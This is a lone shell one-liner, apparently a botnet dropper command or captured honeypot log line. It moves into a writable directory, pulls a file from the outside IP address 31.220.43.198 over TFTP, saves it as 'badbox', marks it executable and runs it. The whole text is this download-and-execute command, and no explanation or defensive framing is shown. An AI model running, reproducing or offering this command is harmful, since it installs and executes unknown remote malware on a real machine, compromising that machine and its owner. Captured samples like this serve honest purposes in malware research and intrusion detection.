cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 31.220.43.198 -c get wget;cat wget >badbox;chmod +x *;./badbox
